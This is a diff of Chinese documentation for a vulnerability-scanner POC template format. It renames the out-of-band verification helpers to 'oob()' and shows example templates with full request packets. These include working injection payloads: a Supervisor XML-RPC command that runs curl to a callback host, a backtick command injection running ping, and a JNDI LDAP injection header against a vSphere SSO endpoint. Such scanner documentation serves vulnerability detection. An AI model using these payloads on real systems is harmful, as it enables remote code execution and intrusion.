@@ -693,40 +693,41 @@ rules:
     expression: response.status == 200 && "((u|g)id|groups)=[0-9]{1,4}\\([a-z0-9]+\\)".bmatches(response.body)
 expression: r0()
 ```
-### wait
-`wait` 用于执行无回显的命令的POC，通过调用外部链接平台，在等待几秒钟后请求该外部链接平台，以验证是否成功接收到命令执行的信号。
+### oob()
+`oob()` 用于执行无回显的命令的POC，通过调用外部链接平台，在等待几秒钟后请求该外部链接平台，以验证是否成功接收到命令执行的信号。
 
-reverse 漏洞验证要求配置 reverse 环境，[配置教程](https://github.com/zan8in/afrog?tab=readme-ov-file#ceye-configuration)
+oob() 漏洞验证要求配置 oob() 环境，[配置教程](https://github.com/zan8in/afrog?tab=readme-ov-file#ceye-configuration)
 
 基本用法
 
 set 声明两个变量
 
-`reverse`: 初始化一个 dnslog 
+`oob`: 初始化一个 dnslog 
 
-`reverseURL`: dnslog 的 url，比如 http://xxxxxx.xxyyy.ceye.io，一般用于 curl {{reverseURL}} 操作
+`oobHTTP`: dnslog 的 url，比如 http://xxxxxx.xxyyy.ceye.io，一般用于 curl {{oobHTTP}} 操作
 
-`reverseHost`: dnslog 的 host，比如 xxyy.ceye.io，一般用于 ping {{reverseHost}} 操作
+`oobDNS`: dnslog 的 host，比如 xxyy.ceye.io，一般用于 ping {{oobDNS}} 操作
 
 ```
 set:
-  reverse: newReverse()
-  reverseURL: reverse.url
-  reverseHost: reverse.url.host
+  oob: oob()
+  oobHTTP: oob.HTTP
+  oobDNS: oob.DNS
 ```
-wait 完整示例
+
+#### OOB HTTP
 
 ```yaml
-id: reverse-demo
+id: oob-http-demo
 
 info:
-  name: Reverse Demo
+  name: OOB HTTP Demo
   author: zan8in
   severity: info
 
 set:
-  reverse: newReverse()
-  reverseURL: reverse.url
+  oob: oob()
+  oobHTTP: oob.HTTP
 rules:
   r0:
     request:
@@ -738,11 +739,11 @@ rules:
           <methodName>supervisor.supervisord.options.warnings.linecache.os.system</methodName>
           <params>
           <param>
-          <string>curl {{reverseURL}}</string>
+          <string>curl {{oobHTTP}}</string>
           </param>
           </params>
         </methodCall>
-    expression: response.status == 200 && reverse.wait(5)
+    expression: oobCheck(oob, oob.ProtocolHTTP, 3)
 expression: r0()
 ```
 请求包
@@ -757,58 +758,67 @@ Content-Type: application/x-www-form-urlencoded
   <methodName>supervisor.supervisord.options.warnings.linecache.os.system</methodName>
   <params>
   <param>
-  <string>curl http://36sSyqGPGpMZ.xxyy.eyes.sh</string>
+  <string>curl http://36sSyqGPGpMZ.xxyy.dnslogxx.sh</string>
   </param>
   </params>
 </methodCall>
 ```
-
-### JNDI
-用于验证 JNDI 相关漏洞
-
-JNDI 漏洞验证要求配置 JNDI 环境，[配置教程](https://github.com/zan8in/afrog?tab=readme-ov-file#jndi-configuration)
-
-基本用法
-
-与 wait 类似，JNDI 也需要使用 set 声明两个变量。
-
-`reverse`: 初始化一个 JNDI 
-
-`jndiURL`: JNDI 的 url，比如 x.x.x.x:1389/uqaUoxlZ067lSK0Mt37aC，一般用于 LDAP 操作
-
-```
-set:
-  reverse: newJNDI()
-  jndiURL: reverse.url.host + reverse.url.path
-```
-wait 完整示例
+#### OOB DNS
 
 ```yaml
-id: reverse-demo
+id: oob-dns-demo
 
 info:
-  name: Reverse Demo
+  name: OOB DNS Demo
   author: zan8in
   severity: info
 
 set:
-  reverse: newJNDI()
-  jndiURL: reverse.url.host + reverse.url.path
+  oob: oob()
+  oobDNS: oob.DNS
+rules:
+  r0:
+    request:
+      method: GET
+      path: /cmd=`ping {{oobDNS}}`
+    expression: oobCheck(oob, oob.ProtocolDNS, 3)
+expression: r0()
+```
+请求包
+```
+GET /cmd=`ping 36sSyqGPGpMZ.xxyy.dnslogxx.sh` HTTP/1.1
+Host: 192.168.66.166
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+```
+
+#### OOB JNDI
+
+```yaml
+id: oob-jndi-demo
+
+info:
+  name: OOB JNDI Demo
+  author: zan8in
+  severity: info
+
+set:
+  oob: oob()
+  oobDNS: oob.DNS
 rules:
   r0:
     request:
       method: GET
       path: /websso/SAML2/SSO/vsphere.local?SAMLRequest=
       headers:
-        X-Forwarded-For: "${jndi:ldap:${::-/}${::-/}{{jndiURL}}}"
-    expression: reverse.jndi(5)
+        X-Forwarded-For: "${jndi://{{oobDNS}}}"
+    expression: oobCheck(oob, oob.ProtocolDNS, 3)
 expression: r0()
 ```
 请求包
 ```
 GET /websso/SAML2/SSO/vsphere.local?SAMLRequest= HTTP/1.1
 Host: 192.168.66.166
-X-Forwarded-For: ${jndi:ldap:${::-/}${::-/}x.x.x.x:1389/QW5qJX3cb16PKivauJxyWl}
+X-Forwarded-For: ${jndi:ldap://x.x.x.x:1389/QW5qJX3cb16PKivauJxyWl}
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
 ```
 ### Ysoserial
